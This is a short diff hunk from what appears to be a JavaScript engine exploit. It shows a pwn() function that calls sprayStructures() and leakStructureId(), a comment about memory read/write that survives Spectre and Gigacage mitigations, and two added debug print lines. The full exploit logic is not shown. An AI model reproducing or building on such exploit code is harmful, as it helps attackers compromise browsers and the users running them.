@@ -211,11 +211,12 @@ function sprayStructures() {
 }
 
 function pwn() {
+    print(“starting”);
     sprayStructures();
 
     var targetArray = new Array();
     var structureid = leakStructureId(targetArray);
-
+    print(structureid);
 // post spectre & gigacage compatible
     // however, memory rw is backed by normal js objects and not typed
     // arrays, and is less reliable
